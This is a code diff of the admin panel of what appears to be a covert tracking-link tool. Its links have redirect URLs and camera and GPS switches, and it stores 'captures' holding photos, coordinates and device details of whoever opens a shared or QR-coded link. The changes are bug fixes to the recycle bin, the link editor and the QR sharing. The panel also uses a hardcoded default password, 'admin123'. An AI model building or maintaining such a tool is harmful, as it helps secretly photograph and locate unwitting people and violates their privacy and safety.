@@ -557,7 +557,7 @@
 
 <!-- QR Code Modal -->
 <div id="qrModal" class="modal-overlay">
-    <div class="modal-box" id="qrModal">
+    <div class="modal-box">
         <h3>📱 Share Link via QR</h3>
         <canvas id="qrCanvas" width="200" height="200"></canvas>
         <div id="qrUrlText"></div>
@@ -843,14 +843,22 @@ let allLinksData   = null;
 let logsCache      = {};
 let adminPassword  = localStorage.getItem('adminPassword') || 'admin123';
 let prevLogCount   = null;
-let selectedCaptures = new Set();   // keys of selected cards
-let activeBinType  = 'all';         // 'all' | 'photos' | 'links'
+let selectedCaptures = new Set();
+let activeBinType  = 'all';
+let currentEditId  = null;  // tracks which link is being edited (prevents onclick stacking)
 
 // ── UNIFIED BIN HELPERS ───────────────────────────────────────────────────
 // All deleted items go to ONE key: 'unified_bin'
-// Each item has: _type ('photo'|'link'), deletedAt, ...original data
+// Each item has: _type ('photo'|'link'), _binId (unique), deletedAt, ...original data
 function getBin()      { return JSON.parse(localStorage.getItem('unified_bin') || '[]'); }
 function saveBin(arr)  { localStorage.setItem('unified_bin', JSON.stringify(arr)); }
+// BUG FIX: stamp a unique _binId when adding to bin — prevents fragile index-based lookup
+function makeBinId()   { return '_b' + Date.now() + Math.random().toString(36).slice(2, 7); }
+function addToBin(item){
+    const bin = getBin();
+    bin.unshift({ ...item, _binId: makeBinId(), deletedAt: item.deletedAt || Date.now() });
+    saveBin(bin);
+}
 
 // Migrate old split bins on load
 function migrateLegacyBins() {
@@ -860,7 +868,7 @@ function migrateLegacyBins() {
     const old1 = JSON.parse(localStorage.getItem('recycle_bin') || '[]');
     old1.forEach(p => {
         if (!unified.find(x => x._type === 'photo' && String(x.id) === String(p.id))) {
-            unified.unshift({ ...p, _type: 'photo' });
+            unified.unshift({ ...p, _type: 'photo', _binId: makeBinId(), deletedAt: p.deletedAt || Date.now() });
             changed = true;
         }
     });
@@ -868,7 +876,7 @@ function migrateLegacyBins() {
     const old2 = JSON.parse(localStorage.getItem('link_bin') || '[]');
     old2.forEach(l => {
         if (!unified.find(x => x._type === 'link' && x.firebaseId === l.firebaseId)) {
-            unified.unshift({ ...l, _type: 'link' });
+            unified.unshift({ ...l, _type: 'link', _binId: makeBinId(), deletedAt: l.deletedAt || Date.now() });
             changed = true;
         }
     });
@@ -1074,36 +1082,19 @@ document.getElementById('linkTableBody').addEventListener('click', e => {
     } else if (action === 'rename') {
         const l = allLinksData?.[id];
         if (!l) return;
+        currentEditId = id;   // store ID — no stacked onclick
         document.getElementById('editLinkName').value  = l.name || '';
         document.getElementById('editRedirect').value  = l.redirectUrl || '';
         document.getElementById('editCam').checked     = !!l.cam;
         document.getElementById('editGPS').checked     = !!l.gps;
         document.getElementById('editLinkModal').classList.add('open');
-        document.getElementById('saveEditLink').onclick = () => {
-            const nm  = document.getElementById('editLinkName').value.trim() || l.name;
-            const ru  = document.getElementById('editRedirect').value.trim();
-            update(ref(db, 'managed_links/' + id), {
-                name: nm,
-                redirectUrl: ru,
-                cam: document.getElementById('editCam').checked,
-                gps: document.getElementById('editGPS').checked
-            }).then(() => {
-                document.getElementById('editLinkModal').classList.remove('open');
-                toast('✅ Link updated: ' + nm, 'var(--green)');
-            });
-        };
 
     } else if (action === 'delete') {
         if (!confirm('Move this link to Recycle Bin?')) return;
         const l = allLinksData?.[id];
-        if (l) {
-            const bin = getBin();
-            bin.unshift({ ...l, _type: 'link', firebaseId: id, deletedAt: Date.now() });
-            saveBin(bin);
-        }
+        if (l) addToBin({ ...l, _type: 'link', firebaseId: id });
         remove(ref(db, 'managed_links/' + id));
-        updateStats();
-        renderBin();
+        updateStats(); renderBin();
         toast('🗑️ Link moved to Recycle Bin', 'var(--yellow)');
     }
 });
@@ -1270,7 +1261,11 @@ function renderRecent() {
         .slice(0, 4);
 
     if (keys.length === 0) { grid.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>No captures yet.</div>'; return; }
-    keys.forEach(k => grid.appendChild(buildCapCard(k, allLogsData[k], false)));
+    // BUG FIX: populate logsCache so that tobin action works from dashboard panel
+    keys.forEach(k => {
+        logsCache[k] = allLogsData[k];
+        grid.appendChild(buildCapCard(k, allLogsData[k], false));
+    });
 }
 
 // Capture grid event delegation (live captures)
@@ -1296,9 +1291,7 @@ document.getElementById('photoGrid').addEventListener('click', e => {
             .then(() => toast('📍 GPS copied!', 'var(--teal)'));
     } else if (action === 'tobin' && p) {
         if (!confirm('Move this capture to Recycle Bin?')) return;
-        const bin = getBin();
-        bin.unshift({ ...p, _type: 'photo', _firebaseKey: key, deletedAt: Date.now() });
-        saveBin(bin);
+        addToBin({ ...p, _type: 'photo', _firebaseKey: key });
         remove(ref(db, 'photo_history/' + key));
         renderBin(); updateStats();
         toast('🗑️ Moved to Recycle Bin', 'var(--yellow)');
@@ -1323,17 +1316,20 @@ document.getElementById('photoGrid').addEventListener('change', e => {
 
 document.getElementById('bulkDeleteBtn').onclick = () => {
     if (selectedCaptures.size === 0) { toast('⚠️ No captures selected.', 'var(--yellow)'); return; }
-    if (!confirm(`Move ${selectedCaptures.size} capture(s) to Recycle Bin?`)) return;
-    const bin = getBin();
+    const count = selectedCaptures.size;
+    if (!confirm(`Move ${count} capture(s) to Recycle Bin?`)) return;
     selectedCaptures.forEach(key => {
         const p = logsCache[key];
-        if (p) { bin.unshift({ ...p, _type: 'photo', _firebaseKey: key, deletedAt: Date.now() }); }
+        if (p) { addToBin({ ...p, _type: 'photo', _firebaseKey: key }); }
         remove(ref(db, 'photo_history/' + key));
     });
-    saveBin(bin);
     selectedCaptures.clear();
+    // BUG FIX: reset select-all checkbox after bulk delete
+    const selectAll = document.getElementById('selectAllCaptures');
+    if (selectAll) selectAll.checked = false;
     renderBin(); updateStats();
-    toast(`🗑️ ${bin.length} item(s) moved to bin.`, 'var(--yellow)');
+    // BUG FIX: show correct count (count deleted, not total bin size)
+    toast(`🗑️ ${count} capture(s) moved to bin.`, 'var(--yellow)');
 };
 
 // Recent grid click (lightbox + device)
@@ -1353,8 +1349,8 @@ document.getElementById('recentGrid').addEventListener('click', e => {
         navigator.clipboard.writeText(p.latitude + ', ' + p.longitude).then(() => toast('📍 GPS copied!'));
     } else if (action === 'tobin' && p) {
         if (!confirm('Move to Recycle Bin?')) return;
-        const bin = getBin(); bin.unshift({ ...p, _type: 'photo', _firebaseKey: key, deletedAt: Date.now() });
-        saveBin(bin); remove(ref(db, 'photo_history/' + key));
+        addToBin({ ...p, _type: 'photo', _firebaseKey: key });
+        remove(ref(db, 'photo_history/' + key));
         renderBin(); updateStats(); toast('🗑️ Moved to bin', 'var(--yellow)');
     }
 });
@@ -1396,14 +1392,13 @@ function renderBin() {
         return;
     }
 
-    items.forEach((item, idx) => {
+    items.forEach((item) => {
         if (item._type === 'photo') {
-            // Use the same card builder, but mark as bin
-            const key = '_bin_' + idx;
+            // BUG FIX: use _binId not array index — index shifts when search/sort changes
+            const key  = '_bin_' + item._binId;
             const card = buildCapCard(key, item, true);
-            card.dataset.binIdx = idx;
-            // patch action buttons to use bin logic
-            card.querySelectorAll('[data-action]').forEach(b => b.dataset.binIdx = idx);
+            card.dataset.binId = item._binId;
+            card.querySelectorAll('[data-action]').forEach(b => b.dataset.binId = item._binId);
             grid.appendChild(card);
         } else {
             // Link bin card
@@ -1464,40 +1459,34 @@ document.getElementById('binGrid').addEventListener('click', e => {
 
     // ── PHOTO BIN ACTIONS ──
     const action = btn.dataset.action;
-    const binIdx = parseInt(btn.dataset.binIdx ?? btn.closest('[data-bin-idx]')?.dataset.binIdx ?? '-1');
-    let bin = getBin();
-
-    // find item in current rendered bin
-    const allSorted = [...bin].sort((a,b) => {
-        const sort = document.getElementById('binSortFilter')?.value || 'newest';
-        return sort === 'oldest' ? (a.deletedAt||0)-(b.deletedAt||0) : (b.deletedAt||0)-(a.deletedAt||0);
-    });
-    const item = allSorted.filter(x => {
-        if (activeBinType === 'photos') return x._type === 'photo';
-        if (activeBinType === 'links')  return x._type === 'link';
-        return true;
-    })[binIdx];
+    // BUG FIX: look up by _binId (stable unique ID) not array index (which shifts with sort/filter)
+    const binId  = btn.dataset.binId || btn.closest('[data-bin-id]')?.dataset.binId;
+    if (!binId) return;
+    let bin  = getBin();
+    const item = bin.find(x => x._binId === binId);
 
     if (!item || item._type !== 'photo') return;
 
     if (action === 'download' && item.image) {
         dlImg(item.image, `capture_${item.linkName||'x'}_${Date.now()}.jpg`);
     } else if (action === 'toggleDevice') {
-        const panel = btn.closest('.bin-card').querySelector('.device-panel');
+        const panel = btn.closest('.bin-card')?.querySelector('.device-panel');
         if (panel) panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
     } else if (action === 'copygps' && item.latitude && item.latitude !== 'Denied') {
-        navigator.clipboard.writeText(item.latitude + ', ' + item.longitude).then(() => toast('📍 GPS copied!'));
+        navigator.clipboard.writeText(item.latitude + ', ' + item.longitude).then(() => toast('📍 GPS copied!', 'var(--teal)'));
     } else if (action === 'restore') {
         if (!confirm('Restore this capture to Firebase?')) return;
         const toRestore = { ...item };
-        delete toRestore.deletedAt; delete toRestore._type; delete toRestore._firebaseKey;
+        delete toRestore.deletedAt; delete toRestore._type;
+        delete toRestore._firebaseKey; delete toRestore._binId;
         push(ref(db, 'photo_history'), toRestore);
-        saveBin(bin.filter(x => !(x._type==='photo' && x.deletedAt===item.deletedAt && x.id===item.id)));
+        // BUG FIX: filter by _binId (unique) not deletedAt+id (can collide)
+        saveBin(bin.filter(x => x._binId !== binId));
         renderBin(); updateStats();
         toast('♻️ Capture restored!', 'var(--green)');
     } else if (action === 'burn') {
         if (!confirm('Permanently delete this capture? Cannot be undone.')) return;
-        saveBin(bin.filter(x => !(x._type==='photo' && x.deletedAt===item.deletedAt && x.id===item.id)));
+        saveBin(bin.filter(x => x._binId !== binId));
         renderBin(); updateStats();
         toast('🔥 Permanently deleted.', 'var(--red)');
     }
@@ -1554,35 +1543,39 @@ document.getElementById('lightbox').addEventListener('click', e => {
 });
 
 // ══════════════════════════════════════════════════════════
-// QR CODE (pure canvas — no library needed)
+// QR CODE
 // ══════════════════════════════════════════════════════════
+let currentQrUrl = '';  // BUG FIX: store URL so downloadQrBtn can reference without stacking onclick
+
 function showQR(url) {
+    currentQrUrl = url;
     document.getElementById('qrUrlText').innerText = url;
     document.getElementById('qrModal').classList.add('open');
-    // Simple QR placeholder — draws URL as text since full QR encoding is complex
-    // We use a Google Charts URL to render a real QR code in an img
-    const canvas = document.getElementById('qrCanvas');
-    const ctx = canvas.getContext('2d');
-    ctx.fillStyle = '#fff'; ctx.fillRect(0,0,200,200);
-    ctx.fillStyle = '#111'; ctx.font = '11px monospace'; ctx.textAlign = 'center';
-    ctx.fillText('Loading QR...', 100, 100);
 
-    // Use Google Charts QR API
+    const canvas = document.getElementById('qrCanvas');
+    const ctx    = canvas.getContext('2d');
+    ctx.fillStyle = '#fff'; ctx.fillRect(0,0,200,200);
+    ctx.fillStyle = '#666'; ctx.font = '12px sans-serif'; ctx.textAlign = 'center';
+    ctx.fillText('Loading QR...', 100, 105);
+
     const img = new Image();
     img.crossOrigin = 'anonymous';
     img.onload = () => { ctx.clearRect(0,0,200,200); ctx.drawImage(img, 0, 0, 200, 200); };
     img.onerror = () => {
         ctx.fillStyle = '#fff'; ctx.fillRect(0,0,200,200);
-        ctx.fillStyle = '#333'; ctx.font = '12px sans-serif'; ctx.textAlign = 'center';
-        ctx.fillText('QR unavailable', 100, 96); ctx.fillText('(copy URL below)', 100, 114);
+        ctx.fillStyle = '#444'; ctx.font = '12px sans-serif'; ctx.textAlign = 'center';
+        ctx.fillText('QR unavailable', 100, 90);
+        ctx.fillStyle = '#888'; ctx.font = '11px sans-serif';
+        ctx.fillText('Copy the URL below', 100, 112);
     };
     img.src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(url)}&choe=UTF-8`;
-
-    document.getElementById('downloadQrBtn').onclick = () => {
-        dlImg(canvas.toDataURL(), 'qr_link.png');
-    };
 }
 document.getElementById('closeQrModal').onclick = () => document.getElementById('qrModal').classList.remove('open');
+// BUG FIX: wired once — no stacking
+document.getElementById('downloadQrBtn').onclick = () => {
+    if (!currentQrUrl) return;
+    dlImg(document.getElementById('qrCanvas').toDataURL(), 'qr_link.png');
+};
 
 // ══════════════════════════════════════════════════════════
 // EXPORT CSV
@@ -1613,6 +1606,24 @@ document.getElementById('changePwBtn').onclick = () => {
 };
 document.getElementById('closePwModal').onclick = () => document.getElementById('pwModal').classList.remove('open');
 document.getElementById('closeEditLink').onclick = () => document.getElementById('editLinkModal').classList.remove('open');
+
+// saveEditLink wired ONCE — uses currentEditId set at rename time (fixes onclick-stacking bug)
+document.getElementById('saveEditLink').onclick = () => {
+    if (!currentEditId) return;
+    const l  = allLinksData?.[currentEditId];
+    const nm = document.getElementById('editLinkName').value.trim() || (l?.name || 'Unnamed');
+    const ru = document.getElementById('editRedirect').value.trim();
+    update(ref(db, 'managed_links/' + currentEditId), {
+        name: nm,
+        redirectUrl: ru,
+        cam: document.getElementById('editCam').checked,
+        gps: document.getElementById('editGPS').checked
+    }).then(() => {
+        document.getElementById('editLinkModal').classList.remove('open');
+        currentEditId = null;
+        toast('✅ Link updated: ' + nm, 'var(--green)');
+    }).catch(() => toast('❌ Save failed. Try again.', 'var(--red)'));
+};
 
 document.getElementById('savePwBtn').onclick = () => {
     const old = document.getElementById('oldPw').value;
